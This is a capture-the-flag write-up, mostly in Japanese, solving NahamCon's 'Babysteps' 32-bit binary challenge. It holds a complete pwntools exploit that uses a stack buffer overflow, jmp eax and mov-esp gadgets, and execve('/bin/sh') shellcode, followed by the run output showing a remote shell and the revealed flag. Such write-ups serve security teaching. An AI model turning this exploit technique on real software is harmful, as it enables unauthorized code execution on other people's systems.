# Babysteps:Binary Exploitation:385pts
Become a baby! Take your first steps and jump around with BABY SIMULATOR 9000!  

**Connect with:**  
```
nc challenge.nahamcon.com 31896
```

**Attachments:** [babysteps](babysteps)　[babysteps.c](babysteps.c)  

# Solution
接続先、ソース、バイナリが渡される。  
ソースを読むと`ask_baby_name`に自明なBOFがある。  
ファイルを調査すると以下のようであった。  
```bash
$ file babysteps
babysteps: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=23b7b1945e8ce3847c586e16d9ccfb70fe7b6973, for GNU/Linux 3.2.0, not stripped
$ checksec babysteps
[*] '/babysteps'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
32bitバイナリで、全セキュリティ機構がOFFのようだ。  
しかしソースを見てもsystemなどはなく、シェルコードを流し込んでやることを考える。  
その際に`jmp esp`(`ff e4`)を探さなければならない。  
objdumpで探しておく。  
```bash
$ objdump -D babysteps > objdump.txt
$ grep 'ff e4' objdump.txt
```
ないため、代替案を探さなければならい。  
```bash
$ grep 'ff e' objdump.txt
 8049545:       ff e0                   jmp    *%eax
```
運よく`jmp eax`があるようだ。  
あとはeaxにespを入れるようなものを見つければよい。  
```bash
$ grep -1 '(%esp),%eax' objdump.txt
080495ac <__x86.get_pc_thunk.ax>:
 80495ac:       8b 04 24                mov    (%esp),%eax
 80495af:       c3                      ret
```
これらをもとに[shellcode](https://inaz2.hatenablog.com/entry/2014/03/13/013056)を実行させる。  
以下のexploit.pyで行う。  
```python
from pwn import *

elf = ELF("./babysteps")
io = remote("challenge.nahamcon.com", 31896)
#io = process(elf.path)
rop = ROP(elf)

# ref. https://inaz2.hatenablog.com/entry/2014/03/13/013056
shellcode = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

jmp_eax = 0x8049545
mov_esp_eax = 0x80495ac

base = b"A" * 28
payload = base + p32(jmp_eax) + p32(mov_esp_eax) + shellcode

io.sendline(payload)
io.interactive()
```
実行する。  
```bash
$ python exploit.py
[*] '/babysteps'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to challenge.nahamcon.com on port 31896: Done
[*] Loaded 10 cached gadgets for './babysteps'
[*] Switching to interactive mode
              _)_
           .-'(/ '-.
          /    `    \
         /  -     -  \
        (`  a     a  `)
         \     ^     /
          '. '---' .'
          .-`'---'`-.
         /           \
        /  / '   ' \  \
      _/  /|       |\  \_
     `/|\` |+++++++|`/|\`
          /\       /\
          | `-._.-` |
          \   / \   /
          |_ |   | _|
          | _|   |_ |
          (ooO   Ooo)

=== BABY SIMULATOR 9000 ===
How's it going, babies!!
Are you ready for the adventure of a lifetime? (literally?)

First, what is your baby name?
$ ls
babysteps
bin
dev
etc
flag.txt
lib
lib32
lib64
libx32
usr
$ cat flag.txt
flag{7d4ce4594f7511f8d7d6d0b1edd1a162}
```
シェルが得られ、flagがファイルに書かれていた。  

## flag{7d4ce4594f7511f8d7d6d0b1edd1a162}